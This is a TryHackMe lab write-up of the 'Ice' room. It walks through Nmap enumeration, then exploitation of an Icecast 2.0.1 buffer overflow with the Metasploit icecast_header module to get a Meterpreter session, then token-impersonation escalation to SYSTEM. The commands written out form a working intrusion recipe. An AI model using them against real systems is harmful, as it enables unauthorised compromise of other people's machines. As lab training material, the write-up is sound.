# TryHackMe - Ice Writeup

## Overview

This repository contains my walkthrough of the Ice room from TryHackMe. The objective of this lab is to exploit a vulnerable Icecast media streaming server and gain SYSTEM-level access to the target machine.

The room demonstrates a basic penetration testing workflow including:

* Enumeration
* Vulnerability Identification
* Exploitation
* Privilege Escalation

---

## Objective

Identify a vulnerability in the target system and exploit it to obtain administrative (SYSTEM) access.

---

## Tools Used

* Nmap – Network scanning and service enumeration
* Metasploit Framework – Exploitation and post-exploitation
* Netcat – Network utility and shell interaction

---

## Target Information

The target machine is running a vulnerable version of the Icecast streaming media server.

---

## Methodology

### 1. Enumeration

The first step was to identify open ports and running services on the target machine using Nmap.

Command used:

nmap -sC -sV <target-ip>

Explanation:

* -sC runs default Nmap scripts
* -sV detects service versions

The scan revealed several open ports including a web service running Icecast.

---

### 2. Vulnerability Identification

Further enumeration showed that the server was running Icecast version 2.0.1, which contains a known buffer overflow vulnerability.

This vulnerability allows attackers to execute arbitrary code remotely on the target system.

---

### 3. Exploitation

To exploit the vulnerability, the Metasploit Framework was used.

Steps performed:

Start Metasploit

msfconsole

Search for Icecast exploit module

search icecast

Use the exploit module

use exploit/windows/http/icecast_header

Set the required parameters

set RHOSTS <target-ip>
set LHOST <your-ip>

Run the exploit

run

After executing the exploit successfully, a Meterpreter session was obtained.

---

### 4. Privilege Escalation

After gaining initial access, privilege escalation was required to gain full administrative control.

The system was vulnerable to token impersonation techniques which allow a low-privileged user to impersonate higher privileged tokens.

Using Metasploit post-exploitation modules, SYSTEM privileges were obtained.

---

### 5. SYSTEM Access

After privilege escalation, the shell was upgraded to NT AUTHORITY\SYSTEM, which provides the highest level of privileges on a Windows system.

Verification command:

getuid

The output confirmed that the session was running with SYSTEM privileges.

---

## Conclusion

This room demonstrates a full attack chain including:

* Network enumeration
* Vulnerability discovery
* Exploitation using Metasploit
* Privilege escalation

The Ice room is a great beginner-friendly lab for understanding how real-world vulnerabilities can lead to full system compromise.

---

## Skills Learned

* Service enumeration with Nmap
* Identifying vulnerable services
* Using Metasploit for exploitation
* Privilege escalation techniques
* Post-exploitation workflow

---

## Disclaimer

This write-up is created for educational purposes only. All activities were performed in a controlled lab environment provided by TryHackMe.
